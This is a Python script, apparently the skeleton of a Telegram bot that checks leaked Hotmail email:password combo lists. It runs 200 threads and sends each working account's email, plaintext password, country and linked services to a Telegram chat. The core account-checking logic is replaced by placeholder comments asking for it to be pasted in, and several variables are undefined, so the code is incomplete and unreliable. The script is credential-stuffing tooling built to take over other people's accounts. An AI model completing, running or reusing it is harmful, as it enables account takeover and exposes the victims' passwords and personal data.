import os
import time
import re
import uuid
import threading
import concurrent.futures
import asyncio
import traceback
from threading import Lock, BoundedSemaphore
import requests
import pycountry

lock = Lock()
rate_limit_semaphore = BoundedSemaphore(500)

class HotmailChecker:
    def __init__(self, bot, chat_id, services):
        self.bot = bot
        self.chat_id = chat_id
        self.services = services
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.processed = 0
        self.total_combos = 0
        self.linked_accounts = {}
        self.checked_accounts = set()
        self.progress_message_id = None

    def send_message(self, text, parse_mode='HTML'):
        print(f"[DEBUG] send_message called: {text[:120]}...")
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            future = asyncio.run_coroutine_threadsafe(
                self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
                loop
            )
            msg = future.result(timeout=15)
            print("[DEBUG] send_message SUCCESS")
            return msg
        except Exception as e:
            print(f"[DEBUG] send_message FAILED: {e}")
            traceback.print_exc()
            return None

    def edit_message(self, message_id, text, parse_mode='HTML'):
        if not message_id:
            return
        print(f"[DEBUG] edit_message called for ID {message_id}")
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            future = asyncio.run_coroutine_threadsafe(
                self.bot.edit_message_text(chat_id=self.chat_id, message_id=message_id, text=text, parse_mode=parse_mode),
                loop
            )
            future.result(timeout=10)
            print("[DEBUG] edit_message SUCCESS")
        except Exception as e:
            print(f"[DEBUG] edit_message FAILED: {e}")

    def create_progress_bar(self, percentage):
        bar_length = 25
        filled = int(bar_length * percentage / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        return f"[{bar}] {percentage:.1f}%"

    def update_progress(self):
        while self.processed < self.total_combos and self.total_combos > 0:
            with lock:
                pct = min((self.processed / self.total_combos) * 100, 100)
                bar = self.create_progress_bar(pct)
                msg = (
                    f"🔄 <b>SCANNING</b>\n"
                    f"{bar}\n\n"
                    f"📊 {self.processed}/{self.total_combos}\n"
                    f"✅ HIT: {self.hit}\n"
                    f"❌ BAD: {self.bad}\n"
                    f"🔄 RETRY: {self.retry}\n"
                    f"🔗 LINKED: {len(self.linked_accounts)}"
                )
            if self.progress_message_id:
                self.edit_message(self.progress_message_id, msg)
            time.sleep(4)

    # ================== TUMHARA ORIGINAL CHECKER LOGIC ==================
    def get_capture(self, email, password):
        # Yahan tumhara pura original get_capture function daal do (jo pehle wale script mein tha)
        # Main sirf end mein HIT message bhej raha hoon
        try:
            # ... pura get_capture logic paste kar do yahan ...
            # Agar HIT mila toh yeh part rakho:
            if linked_services:   # agar koi services mile
                hit_text = (
                    f"🔱 HOTMAİL HÍT BULUNDU 🔱\n"
                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                    f"📧 Email: {email}\n"
                    f"🔑 Password: {password}\n"
                    f"👤 Name: {name if 'name' in locals() else 'N/A'}\n"
                    f"🌍 Country: {flag} {country}\n"
                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                    f"🔗 EMAIL IN INBOX:\n" +
                    "\n".join([f"✔ {s}" for s in linked_services]) +
                    f"\n\n📊 Toplam Hit: {self.hit}\n"
                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                    f"𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT"
                )
                self.send_message(hit_text)
                with lock:
                    self.hit += 1
                    self.linked_accounts[email] = linked_services
        except Exception as e:
            print(f"[DEBUG] get_capture error: {e}")

    def check_combo(self, email, password):
        with rate_limit_semaphore:
            with lock:
                self.processed += 1
            print(f"[DEBUG] check_combo started for {email}")
            # Yahan tumhara pura original check_account + get_capture call
            # Example:
            # result = self.check_account(email, password)
            # if result == "HIT":
            #     self.get_capture(email, password)
            # else:
            #     with lock:
            #         self.bad += 1

    def run(self, threads=200):
        print("[DEBUG] run() STARTED with 200 threads")
        try:
            with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)
            print(f"[DEBUG] Loaded {self.total_combos} combos")

            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check with 200 threads...")

            # Progress bar message
            progress_msg = self.send_message(
                "🔄 <b>SCANNING</b>\n"
                "[░░░░░░░░░░░░░░░░░░░░░░░░░] 0.0%\n\n"
                "📊 0/0\n✅ HIT: 0\n❌ BAD: 0\n🔄 RETRY: 0\n🔗 LINKED: 0"
            )
            if progress_msg:
                self.progress_message_id = progress_msg.message_id

            progress_thread = threading.Thread(target=self.update_progress, daemon=True)
            progress_thread.start()
            print("[DEBUG] Progress bar thread STARTED")

            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                print(f"[DEBUG] Launching {threads} worker threads")
                for line in lines:
                    try:
                        email, pw = line.split(":", 1)
                        executor.submit(self.check_combo, email.strip(), pw.strip())
                    except:
                        continue

            time.sleep(5)
            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad}")
            print("[DEBUG] Checking finished")

        except Exception as e:
            print(f"[DEBUG] run() ERROR: {e}")
            traceback.print_exc()